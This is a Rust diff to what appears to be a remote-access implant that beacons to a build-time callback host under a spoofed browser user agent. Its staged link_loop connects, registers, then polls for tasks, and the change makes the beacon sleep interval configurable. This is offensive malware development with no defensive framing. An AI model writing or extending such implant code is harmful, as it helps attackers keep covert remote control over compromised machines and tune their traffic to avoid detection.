@@ -3,9 +3,18 @@ use serde::{Deserialize, Serialize};
 use std::env;
 use std::net::UdpSocket;
 use std::process::Command;
+use std::sync::atomic::{AtomicU64, Ordering};
 
 const CALLBACK: &str = env!("CALLBACK");
 const UA: &str = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";
+
+// ── Sleep configuration ───────────────────────────────────────────────────────
+
+static SLEEP_SECONDS: AtomicU64 = AtomicU64::new(5);
+
+fn get_sleep_seconds() -> u64 {
+    SLEEP_SECONDS.load(Ordering::Relaxed)
+}
 
 // ── Wire types ───────────────────────────────────────────────────────────────
 
@@ -108,7 +117,7 @@ pub fn link_loop() {
         if client.get(format!("{}/js", base)).send().is_ok() {
             break;
         }
-        sleep(5);
+        sleep(get_sleep_seconds());
     }
 
     // Stage 2: register
@@ -131,7 +140,7 @@ pub fn link_loop() {
                 break t.x_request_id;
             }
         }
-        sleep(5);
+        sleep(get_sleep_seconds());
     };
 
     // Stage 3: polling loop
@@ -169,7 +178,7 @@ pub fn link_loop() {
             }
         }
 
-        sleep(5);
+        sleep(get_sleep_seconds());
     }
 }
 
